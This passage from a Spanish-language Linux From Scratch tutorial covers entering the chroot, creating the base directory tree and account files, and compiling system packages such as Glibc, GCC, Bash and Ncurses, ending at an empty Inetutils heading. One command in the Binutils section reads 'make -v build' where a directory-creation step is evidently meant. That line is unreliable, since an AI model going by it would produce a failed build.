chroot &quot;$LFS&quot; /tools/bin/env -i \
    HOME=/root                  \
    TERM=&quot;$TERM&quot;                \
    PS1='(lfs chroot) \u:\w\$ ' \
    PATH=/bin:/usr/bin:/sbin:/usr/sbin:/tools/bin \
    /tools/bin/bash --login +h
```

Una vez ejecutado, deberíamos ver algo como esto:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349qP.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Como vemos, en '*/sources*' deberíamos ver todos nuestros archivos comprimidos que habíamos obtenido del archivo **wget-list**.

Si esto es así, podremos continuar.

##### Creación de directorios

Antes de continuar, será necesario crear una estructura base para el sistema de archivos de nuestro sistema Linux. Crearemos un árbol estándar de directorios ejecutando los siguientes comandos:

```bash
mkdir -pv /{bin,boot,etc/{opt,sysconfig},home,lib/firmware,mnt,opt}
mkdir -pv /{media/{floppy,cdrom},sbin,srv,var}
install -dv -m 0750 /root
install -dv -m 1777 /tmp /var/tmp
mkdir -pv /usr/{,local/}{bin,include,lib,sbin,src}
mkdir -pv /usr/{,local/}share/{color,dict,doc,info,locale,man}
mkdir -v  /usr/{,local/}share/{misc,terminfo,zoneinfo}
mkdir -v  /usr/libexec
mkdir -pv /usr/{,local/}share/man/man{1..8}
mkdir -v  /usr/lib/pkgconfig

case $(uname -m) in
 x86_64) mkdir -v /lib64 ;;
esac

mkdir -v /var/{log,mail,spool}
ln -sv /run /var/run
ln -sv /run/lock /var/lock
mkdir -pv /var/{opt,cache,lib/{color,misc,locate},local}
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349rN.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Creación de archivos esenciales y Links Simbólicos

Algunos programas usan rutas &quot;cableadas&quot; a programas que aún no existen. Para satisfacer la accesibilidad de estos programas, crearemos una serie de enlaces simbólicos los cuales serán reemplazados por archivos reales:

```bash
ln -sv /tools/bin/{bash,cat,chmod,dd,echo,ln,mkdir,pwd,rm,stty,touch} /bin
ln -sv /tools/bin/{env,install,perl,printf}         /usr/bin
ln -sv /tools/lib/libgcc_s.so{,.1}                  /usr/lib
ln -sv /tools/lib/libstdc++.{a,so{,.6}}             /usr/lib
ln -sv bash /bin/sh
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349rQ.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez hecho, para satisfacer las utilidades que esperan la presencia de `/etc/mtab`, crearemos otro enlace simbólico:

```bash
ln -sv /proc/self/mounts /etc/mtab
```

Para que el usuario **root** pueda iniciar sesión y para que se reconozca el nombre **root**, deben de haber entradas relevantes en los archivos '*/etc/passwd*' y '*/etc/group*'.

Crearemos estos archivos de la siguiente forma:

```bash
cat &gt; /etc/passwd &lt;&lt; &quot;EOF&quot;
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/dev/null:/bin/false
daemon:x:6:6:Daemon User:/dev/null:/bin/false
messagebus:x:18:18:D-Bus Message Daemon User:/var/run/dbus:/bin/false
nobody:x:99:99:Unprivileged User:/dev/null:/bin/false
EOF

cat &gt; /etc/group &lt;&lt; &quot;EOF&quot;
root:x:0:
bin:x:1:daemon
sys:x:2:
kmem:x:3:
tape:x:4:
tty:x:5:
daemon:x:6:
floppy:x:7:
disk:x:8:
lp:x:9:
dialout:x:10:
audio:x:11:
video:x:12:
utmp:x:13:
usb:x:14:
cdrom:x:15:
adm:x:16:
messagebus:x:18:
input:x:24:
mail:x:34:
kvm:x:61:
wheel:x:97:
nogroup:x:99:
users:x:999:
EOF
```

Por último, para eliminar la cadena **I have no name!**, iniciaremos una nueva shell:

```bash
exec /tools/bin/bash --login +h
```

Todo este proceso, debería verse de la siguiente forma:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349rP.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Al final de la imagen, lo que he hecho ha sido inicializar los archivos de registro y asignarles los permisos adecuados, serían estos comandos:

```bash
touch /var/log/{btmp,lastlog,faillog,wtmp}
chgrp -v utmp /var/log/lastlog
chmod -v 664  /var/log/lastlog
chmod -v 600  /var/log/btmp
```

#### Instalación del Software básico del sistema

Comienza una nueva labor de compilación, esta vez en el entorno chroot. Si la anterior nos pareció larga... en esta sí que habrá que armarse de paciencia, porque será el triple de larga.

Os iré definiendo por cada paquete los comandos que tendréis que ir ejecutando a nivel de sistema. La compilación de estos paquetes si seguís paso a paso los comandos no os deberían de dar error (salvo algún que otro `make check`, pero por lo demás las instalaciones se deberían realizar correctamente).

Antes de proseguir, deberemos situarnos en el directorio `/sources`, que es donde se sitúan todos los comprimidos.

##### API Headers en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
make mrproper

make headers
find usr/include -name '.*' -delete
rm usr/include/Makefile
cp -rv usr/include/* /usr/include
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Man pages en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos el siguiente comando:

```bash
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Glibc en LFS

**AVISO:** La compilación e instalación de este paquete puede demorar bastante tiempo, así que tendréis que salir un poco a tomar el aire. Asimismo, la fase del `make check` es normal que de algún que otro fallo, pero no hay de qué preocuparse.

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
patch -Np1 -i ../glibc-2.31-fhs-1.patch

case $(uname -m) in
    i?86)   ln -sfv ld-linux.so.2 /lib/ld-lsb.so.3
    ;;
    x86_64) ln -sfv ../lib/ld-linux-x86-64.so.2 /lib64
            ln -sfv ../lib/ld-linux-x86-64.so.2 /lib64/ld-lsb-x86-64.so.3
    ;;
esac

mkdir -v build
cd       build

CC=&quot;gcc -ffile-prefix-map=/tools=/usr&quot; \
../configure --prefix=/usr                          \
             --disable-werror                       \
             --enable-kernel=3.2                    \
             --enable-stack-protector=strong        \
             --with-headers=/usr/include            \
             libc_cv_slibdir=/lib

make

case $(uname -m) in
  i?86)   ln -sfnv $PWD/elf/ld-linux.so.2        /lib ;;
  x86_64) ln -sfnv $PWD/elf/ld-linux-x86-64.so.2 /lib ;;
esac

make check

touch /etc/ld.so.conf
sed '/test-installation/s@$(PERL)@echo not running@' -i ../Makefile
make install
cp -v ../nscd/nscd.conf /etc/nscd.conf
mkdir -pv /var/cache/nscd
```

Deberíais poder llegar hasta aquí sin problemas:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349xv.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Ahora bien, toca instalar las configuraciones regionales. Ejecutaremos estos comandos:

```bash
mkdir -pv /usr/lib/locale
localedef -i POSIX -f UTF-8 C.UTF-8 2&gt; /dev/null || true
localedef -i cs_CZ -f UTF-8 cs_CZ.UTF-8
localedef -i de_DE -f ISO-8859-1 de_DE
localedef -i de_DE@euro -f ISO-8859-15 de_DE@euro
localedef -i de_DE -f UTF-8 de_DE.UTF-8
localedef -i el_GR -f ISO-8859-7 el_GR
localedef -i en_GB -f UTF-8 en_GB.UTF-8
localedef -i en_HK -f ISO-8859-1 en_HK
localedef -i en_PH -f ISO-8859-1 en_PH
localedef -i en_US -f ISO-8859-1 en_US
localedef -i en_US -f UTF-8 en_US.UTF-8
localedef -i es_MX -f ISO-8859-1 es_MX
localedef -i fa_IR -f UTF-8 fa_IR
localedef -i fr_FR -f ISO-8859-1 fr_FR
localedef -i fr_FR@euro -f ISO-8859-15 fr_FR@euro
localedef -i fr_FR -f UTF-8 fr_FR.UTF-8
localedef -i it_IT -f ISO-8859-1 it_IT
localedef -i it_IT -f UTF-8 it_IT.UTF-8
localedef -i ja_JP -f EUC-JP ja_JP
localedef -i ja_JP -f SHIFT_JIS ja_JP.SIJS 2&gt; /dev/null || true
localedef -i ja_JP -f UTF-8 ja_JP.UTF-8
localedef -i ru_RU -f KOI8-R ru_RU.KOI8-R
localedef -i ru_RU -f UTF-8 ru_RU.UTF-8
localedef -i tr_TR -f UTF-8 tr_TR.UTF-8
localedef -i zh_CN -f GB18030 zh_CN.GB18030
localedef -i zh_HK -f BIG5-HKSCS zh_HK.BIG5-HKSCS
```

Y por último, este otro comando, el cual puede llevar bastante tiempo:

```bash
make localedata/install-locales
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349xN.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;


Una vez hecho, crearemos un nuevo archivo '*/etc/nsswitch.conf*' aplicando el siguiente comando:

```bash
cat &gt; /etc/nsswitch.conf &lt;&lt; &quot;EOF&quot;
# Begin /etc/nsswitch.conf

passwd: files
group: files
shadow: files

hosts: files dns
networks: files

protocols: files
services: files
ethers: files
rpc: files

# End /etc/nsswitch.conf
EOF
```

Este archivo es necesario dado que los valores predeterminados **Glibc** no funcionan correctamente en un entorno de red.

Añadiremos los datos relacionados con la zona horaria ejecutando los siguientes comandos:

```bash
tar -xf ../../tzdata2019c.tar.gz

ZONEINFO=/usr/share/zoneinfo
mkdir -pv $ZONEINFO/{posix,right}

for tz in etcetera southamerica northamerica europe africa antarctica  \
          asia australasia backward pacificnew systemv; do
    zic -L /dev/null   -d $ZONEINFO       ${tz}
    zic -L /dev/null   -d $ZONEINFO/posix ${tz}
    zic -L leapseconds -d $ZONEINFO/right ${tz}
done

cp -v zone.tab zone1970.tab iso3166.tab $ZONEINFO
zic -d $ZONEINFO -p America/New_York
unset ZONEINFO
```

Ya en este punto, ejecutaremos el siguiente comando:

```
tzselect
```

En mi caso estoy en Canarias, por tanto seleccionaré las siguientes opciones:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349zC.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez seleccionadas estas opciones, crearemos el siguiente enlace simbólico con el nombre de la zona horaria previamente seleccionada:

```bash
ln -sfv /usr/share/zoneinfo/&lt;xxx&gt; /etc/localtime
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349zH.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Por último, configuraremos el cargador dinámico:

```bash
cat &gt; /etc/ld.so.conf &lt;&lt; &quot;EOF&quot;
# Begin /etc/ld.so.conf
/usr/local/lib
/opt/lib

EOF

cat &gt;&gt; /etc/ld.so.conf &lt;&lt; &quot;EOF&quot;
# Add an include directory
include /etc/ld.so.conf.d/*.conf

EOF
mkdir -pv /etc/ld.so.conf.d
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349zW.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Ajuste de la Toolchain

Ahora que se han instalado las bibliotecas de C finales, es hora de ajustar la cadena de herramientas para que se vincule cualquier programa recién compilado con estas bibliotecas nuevas.

Ejecutamos los siguientes comandos:

```bash
mv -v /tools/bin/{ld,ld-old}
mv -v /tools/$(uname -m)-pc-linux-gnu/bin/{ld,ld-old}
mv -v /tools/bin/{ld-new,ld}
ln -sv /tools/bin/ld /tools/$(uname -m)-pc-linux-gnu/bin/ld

gcc -dumpspecs | sed -e 's@/tools@@g'                   \
    -e '/\*startfile_prefix_spec:/{n;s@.*@/usr/lib/ @}' \
    -e '/\*cpp:/{n;s@$@ -isystem /usr/include@}' &gt;      \
    `dirname $(gcc --print-libgcc-file-name)`/specs

echo 'int main(){}' &gt; dummy.c
cc dummy.c -v -Wl,--verbose &amp;&gt; dummy.log
readelf -l a.out | grep ': /lib'
```

Si una vez aplicados estos comandos nos sale el siguiente output, es que todo está correcto:

```bash
[Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349Ae.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Ahora bien, ¿quieres quedarte tranquilo y saber si todo se ha hecho correctamente?, hagamos las siguientes comprobaciones.

```bash
grep -o '/usr/lib.*/crt[1in].*succeeded' dummy.log
grep -B1 '^ /usr/include' dummy.log
grep 'SEARCH.*/usr/lib' dummy.log |sed 's|; |\n|g'
grep &quot;/lib.*/libc.so.6 &quot; dummy.log
grep found dummy.log
```

Si la ejecución de cada uno de estos comandos nos devuelve los siguientes resultados, es que todo está correcto:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349Ev.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

El último comando ejecutado, es para limpiar los archivos de prueba:

```bash
rm -v dummy.c a.out dummy.log
```

Como esta fase ha llevado su tiempo, lo mejor es hacer otra Snapshot:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349EP.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Zlib en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr

make
make check
make install

mv -v /usr/lib/libz.so.* /lib
ln -sfv ../../lib/$(readlink /usr/lib/libz.so) /usr/lib/libz.so
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Bzip2 en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
patch -Np1 -i ../bzip2-1.0.8-install_docs-1.patch
sed -i 's@\(ln -s -f \)$(PREFIX)/bin/@\1@' Makefile
sed -i &quot;s@(PREFIX)/man@(PREFIX)/share/man@g&quot; Makefile
make -f Makefile-libbz2_so
make clean

make
make PREFIX=/usr install

cp -v bzip2-shared /bin/bzip2
cp -av libbz2.so* /lib
ln -sv ../../lib/libbz2.so.1.0 /usr/lib/libbz2.so
rm -v /usr/bin/{bunzip2,bzcat,bzip2}
ln -sv bzip2 /bin/bunzip2
ln -sv bzip2 /bin/bzcat
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Xz en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr    \
            --disable-static \
            --docdir=/usr/share/doc/xz-5.2.4

make
make check

make install
mv -v   /usr/bin/{lzma,unlzma,lzcat,xz,unxz,xzcat} /bin
mv -v /usr/lib/liblzma.so.* /lib
ln -svf ../../lib/$(readlink /usr/lib/liblzma.so) /usr/lib/liblzma.so
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### File en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr
make
make check
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Readline en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
sed -i '/MV.*old/d' Makefile.in
sed -i '/{OLDSUFF}/c:' support/shlib-install

./configure --prefix=/usr    \
            --disable-static \
            --docdir=/usr/share/doc/readline-8.0

make SHLIB_LIBS=&quot;-L/tools/lib -lncursesw&quot;
make SHLIB_LIBS=&quot;-L/tools/lib -lncursesw&quot; install
mv -v /usr/lib/lib{readline,history}.so.* /lib
chmod -v u+w /lib/lib{readline,history}.so.*
ln -sfv ../../lib/$(readlink /usr/lib/libreadline.so) /usr/lib/libreadline.so
ln -sfv ../../lib/$(readlink /usr/lib/libhistory.so ) /usr/lib/libhistory.so

install -v -m644 doc/*.{ps,pdf,html,dvi} /usr/share/doc/readline-8.0
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### M4 en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
sed -i 's/IO_ftrylockfile/IO_EOF_SEEN/' lib/*.c
echo &quot;#define _IO_IN_BACKUP 0x100&quot; &gt;&gt; lib/stdio-impl.h

./configure --prefix=/usr
make
make check
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Bc en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
PREFIX=/usr CC=gcc CFLAGS=&quot;-std=c99&quot; ./configure.sh -G -O3

make
make test
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Binutils en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, comenzaremos haciendo una pequeña verificación con el siguiente comando:

```bash
expect -c &quot;spawn ls&quot;
```

Si la ejecución de este comando devuelve el siguiente output:

```bash
spawn ls
```

Entonces podemos quedarnos tranquilos.

Posteriormente, ejecutaremos los siguientes comandos:

```bash
sed -i '/@\tincremental_copy/d' gold/testsuite/Makefile.in
make -v build
cd build

../configure --prefix=/usr       \
             --enable-gold       \
             --enable-ld=default \
             --enable-plugins    \
             --enable-shared     \
             --disable-werror    \
             --enable-64-bit-bfd \
             --with-system-zlib

make tooldir=/usr
make -k check
make tooldir=/usr install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### GMP en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr    \
            --enable-cxx     \
            --disable-static \
            --docdir=/usr/share/doc/gmp-6.2.0

make
make html
make check 2&gt;&amp;1 | tee gmp-check-log
awk '/# PASS:/{total+=$3} ; END{print total}' gmp-check-log # Verificamos que la ejecución de este comando devuelva un número mayor a 190
make install
make install-html
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### MPFR en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr        \
            --disable-static     \
            --enable-thread-safe \
            --docdir=/usr/share/doc/mpfr-4.0.2

make
make html
make check
make install
make install-html
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### MPC en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr    \
            --disable-static \
            --docdir=/usr/share/doc/mpc-1.1.0

make
make html
make check
make install
make install-html
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Attr en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr     \
            --bindir=/bin     \
            --disable-static  \
            --sysconfdir=/etc \
            --docdir=/usr/share/doc/attr-2.4.48

make
make check
make install

mv -v /usr/lib/libattr.so.* /lib
ln -sfv ../../lib/$(readlink /usr/lib/libattr.so) /usr/lib/libattr.so
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Acl en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr         \
            --bindir=/bin         \
            --disable-static      \
            --libexecdir=/usr/lib \
            --docdir=/usr/share/doc/acl-2.2.53

make
make install

mv -v /usr/lib/libacl.so.* /lib
ln -sfv ../../lib/$(readlink /usr/lib/libacl.so) /usr/lib/libacl.so
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Instalación del Shadow

Para configurar el **Shadow** en nuestro sistema Linux, comenzaremos descomprimiendo el comprimido correspondiente. Posteriormente, ejecutaremos los siguientes comandos:

```bash
sed -i 's/groups$(EXEEXT) //' src/Makefile.in
find man -name Makefile.in -exec sed -i 's/groups\.1 / /'   {} \;
find man -name Makefile.in -exec sed -i 's/getspnam\.3 / /' {} \;
find man -name Makefile.in -exec sed -i 's/passwd\.5 / /'   {} \;

sed -i -e 's@#ENCRYPT_METHOD DES@ENCRYPT_METHOD SHA512@' \
       -e 's@/var/spool/mail@/var/mail@' etc/login.defs

sed -i 's@DICTPATH.*@DICTPATH\t/lib/cracklib/pw_dict@' etc/login.defs
sed -i 's/1000/999/' etc/useradd
./configure --sysconfdir=/etc --with-group-name-max-length=32

make
make install
```

Una vez hecho, configuramos el shadow habilitando las `shadowed passwords` y las `shadowed group passwords`:

```bash
pwconv
grpconv
```

Por último, asignaremos una contraseña al usuario root:

```bash
passwd root
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349QH.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### GCC en LFS

**AVISO**: La instalación de este paquete puede demorar MUCHO tiempo, así que paciencia.

Comenzaremos descomprimiendo el comprimido correspondiente. Una vez hecho, ejecutaremos los siguientes comandos:

```bash
case $(uname -m) in
  x86_64)
    sed -e '/m64=/s/lib64/lib/' \
        -i.orig gcc/config/i386/t-linux64
  ;;
esac

sed -e '1161 s|^|//|' \
    -i libsanitizer/sanitizer_common/sanitizer_platform_limits_posix.cc

mkdir -v build
cd build

SED=sed                               \
../configure --prefix=/usr            \
             --enable-languages=c,c++ \
             --disable-multilib       \
             --disable-bootstrap      \
             --with-system-zlib

make

ulimit -s 32768

chown -Rv nobody . 
su nobody -s /bin/bash -c &quot;PATH=$PATH make -k check&quot; # Es normal que puedan salir errores en la ejecución de este comando, no hay de qué preocuparse.

../contrib/test_summary
```

Una vez hecho, proseguiremos con la instalación:

```bash
make install
rm -rf /usr/lib/gcc/$(gcc -dumpmachine)/9.2.0/include-fixed/bits/

chown -v -R root:root \
    /usr/lib/gcc/*linux-gnu/9.2.0/include{,-fixed}

ln -sv ../usr/bin/cpp /lib

ln -sv gcc /usr/bin/cc

install -v -dm755 /usr/lib/bfd-plugins
ln -sfv ../../libexec/gcc/$(gcc -dumpmachine)/9.2.0/liblto_plugin.so \
        /usr/lib/bfd-plugins/
```

¿Hay alguna forma en este punto de saber si la instalación se ha realizado con éxito?, efectivamente, tenemos una forma.

La idea será ejecutar los siguientes comandos:

```bash
echo 'int main(){}' &gt; dummy.c
cc dummy.c -v -Wl,--verbose &amp;&gt; dummy.log
readelf -l a.out | grep ': /lib'

grep -o '/usr/lib.*/crt[1in].*succeeded' dummy.log

grep -B4 '^ /usr/include' dummy.log

grep 'SEARCH.*/usr/lib' dummy.log |sed 's|; |\n|g'

grep &quot;/lib.*/libc.so.6 &quot; dummy.log

grep found dummy.log

rm -v dummy.c a.out dummy.log

mkdir -pv /usr/share/gdb/auto-load/usr/lib
mv -v /usr/lib/*gdb.py /usr/share/gdb/auto-load/usr/lib
```

Para saber si todo está en orden, deberás comparar el output con lo siguiente que me sale a mi:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34ap1.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Si los outputs te coinciden por la ejecución de cada comando aislado, entonces está todo correcto y podrás continuar.

Como esta fase ha llevado mucho tiempo, lo suyo será hacer otra Snapshot:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34ape.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

¡No te olvides de retroceder los directorios correspondientes y borrar el directorio principal del archivo descomprimido!

##### Pk config en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr              \
            --with-internal-glib       \
            --disable-host-tool        \
            --docdir=/usr/share/doc/pkg-config-0.29.2

make
make check
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Ncurses en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
sed -i '/LIBTOOL_INSTALL/d' c++/Makefile.in

./configure --prefix=/usr           \
            --mandir=/usr/share/man \
            --with-shared           \
            --without-debug         \
            --without-normal        \
            --enable-pc-files       \
            --enable-widec

make
make install

mv -v /usr/lib/libncursesw.so.6* /lib
ln -sfv ../../lib/$(readlink /usr/lib/libncursesw.so) /usr/lib/libncursesw.so

for lib in ncurses form panel menu ; do
    rm -vf                    /usr/lib/lib${lib}.so
    echo &quot;INPUT(-l${lib}w)&quot; &gt; /usr/lib/lib${lib}.so
    ln -sfv ${lib}w.pc        /usr/lib/pkgconfig/${lib}.pc
done

rm -vf                     /usr/lib/libcursesw.so
echo &quot;INPUT(-lncursesw)&quot; &gt; /usr/lib/libcursesw.so
ln -sfv libncurses.so      /usr/lib/libcurses.so

mkdir -v       /usr/share/doc/ncurses-6.2
cp -v -R doc/* /usr/share/doc/ncurses-6.2
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Libcap en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
sed -i '/install.*STA...LIBNAME/d' libcap/Makefile
make lib=lib
make test
make lib=lib install
chmod -v 755 /lib/libcap.so.2.31
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Sed en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
sed -i 's/usr/tools/'                 build-aux/help2man
sed -i 's/testsuite.panic-tests.sh//' Makefile.in

./configure --prefix=/usr --bindir=/bin

make
make html
make check

make install
install -d -m755           /usr/share/doc/sed-4.8
install -m644 doc/sed.html /usr/share/doc/sed-4.8
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Psmisc en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr

make
make install

mv -v /usr/bin/fuser   /bin
mv -v /usr/bin/killall /bin
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Iana Etc en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
make
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Bison en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr --docdir=/usr/share/doc/bison-3.5.2
make
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Flex en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
sed -i &quot;/math.h/a #include &lt;malloc.h&gt;&quot; src/flexdef.h

HELP2MAN=/tools/bin/true \
./configure --prefix=/usr --docdir=/usr/share/doc/flex-2.6.4

make
make check
make install

ln -sv flex /usr/bin/lex
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Grep en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr --bindir=/bin

make
make check
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Bash en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
patch -Np1 -i ../bash-5.0-upstream_fixes-1.patch

./configure --prefix=/usr                    \
            --docdir=/usr/share/doc/bash-5.0 \
            --without-bash-malloc            \
            --with-installed-readline

make
chown -Rv nobody .
su nobody -s /bin/bash -c &quot;PATH=$PATH HOME=/home make tests&quot;
make install
mv -vf /usr/bin/bash /bin

exec /bin/bash --login +h
```

Con este último comando, lo que estaremos haciendo será ejecutar el programa **Bash** recientemente compilado, reemplazando así el que se está ejecutando actualmente:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bmN.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Libtool en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr
make
make check # Es posible que salgan errores, pero no hay de qué preocuparse
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### GDBM en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr    \
            --disable-static \
            --enable-libgdbm-compat

make
make check
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Gperf en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr --docdir=/usr/share/doc/gperf-3.1

make
make -j1 check
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Expat en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
sed -i 's|usr/bin/env |bin/|' run.sh.in

./configure --prefix=/usr    \
            --disable-static \
            --docdir=/usr/share/doc/expat-2.2.9

make
make check
make install

install -v -m644 doc/*.{html,png,css} /usr/share/doc/expat-2.2.9
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Inetutils en LFS

